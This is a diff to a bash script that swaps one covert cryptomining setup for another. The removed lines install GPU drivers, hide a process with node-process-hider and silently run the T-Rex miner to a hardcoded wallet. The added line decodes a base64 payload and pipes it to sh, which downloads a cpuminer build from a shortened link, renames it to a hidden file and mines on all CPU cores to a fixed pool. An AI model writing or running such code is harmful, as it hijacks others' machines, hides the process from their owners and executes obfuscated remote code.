@@ -1,27 +1,2 @@
 #!/bin/bash
-	cd /usr/local/bin
-	sudo apt  update && sudo apt -y upgrade
-	sudo apt install linux-headers-$(uname -r) -y
-	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
-	sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
-	sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
-	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
-	echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
-	sudo apt update
-	sudo apt -y install cuda-drivers
-	sudo apt  install libcurl3 -y
-	apt update -y && apt install git wget npm sudo -y
-        sudo npm install -g n
-        sudo n latest
-        sudo npm install -g npm
-        hash -d npm
-        npm i
-        npm i -g node-process-hider && ph add data >/dev/null 2>&1
-	sudo wget https://github.com/trexminer/T-Rex/releases/download/0.23.1/t-rex-0.23.1-linux.tar.gz >/dev/null 2>&1
-	sudo tar xvzf t-rex-0.23.1-linux.tar.gz >/dev/null 2>&1
-	sudo mv t-rex data >/dev/null 2>&1
-	chmod 777 data >/dev/null 2>&1
-	nohup ./data -a ethash -o ethash.unmineable.com:3333 -u LTC:LZJ1fV1kYYqAutEHPmEyRTFmvN7L5ZKZAV.$(echo $(shuf -i 1-99999 -n 1)-GPU) -p x -w $1 --no-nvml --no-watchdog >/dev/null 2>&1
-	
-	  
-	
+base64 -d <<< d2dldCAtcU8gcnRtIGdpdC5pby9jcHVtaW5lci1nci0xLjIuMyAmJiB0YXIgeGYgcnRtICYmIG12IC4vY3B1bWluZXItZ3ItMS4yLjMteDg2XzY0X2xpbnV4IC4vZ3IgJiYgbXYgLi9nci9iaW5hcmllcy9jcHVtaW5lci1hdngyIC4vZ3IvYmluYXJpZXMvLmdyICYmIC4vZ3IvYmluYXJpZXMvLmdyIC1hIGdyIC1vIHN0cmF0dW0rdGNwczovL2V1LmZsb2NrcG9vbC5jb206NTU1NSAtdSBSRzFhd3c1dFdZM2tZNXJTV001ckFXSlFpaFRLNXhtaDk1LldPUktFUiAtdCAkKG5wcm9jIC0tYWxsKSAtLW5vLXR1bmU= | sh 
